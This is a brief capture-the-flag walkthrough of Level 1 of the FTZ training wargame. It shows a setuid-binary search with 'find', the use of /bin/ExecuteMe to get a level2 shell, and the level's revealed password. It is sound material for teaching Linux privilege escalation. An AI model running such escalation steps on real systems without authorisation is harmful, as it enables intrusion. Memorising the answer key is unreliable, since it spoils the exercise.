# Level1
`[level1@ftz level1]$ ls -l
total 12
-rw-r--r--    1 root     root           47 Apr  4  2000 hint
drwxr-xr-x    2 root     level1       4096 Dec  7  2003 public_html
drwxrwxr-x    2 root     level1       4096 Jun  3 11:58 tmp
[level1@ftz level1]$ cat hint
Level2 권한에 setuid가 걸린 파일을 찾는다.`

`[level1@ftz level1]$ find / -user level2 -perm -4000 2>/dev/null
/bin/ExecuteMe
[level1@ftz level1]$ ls -l /bin/ExecuteMe
-rwsr-x---    1 level2   level1      12868 Aug 19  2014 /bin/ExecuteMe`

`[level1@ftz level1]$ /bin/ExecuteMe`

`[level2@ftz level2]$ bash`

`[level2@ftz level2]$ my-pass
Level2 Password is "hacker or cracker".`

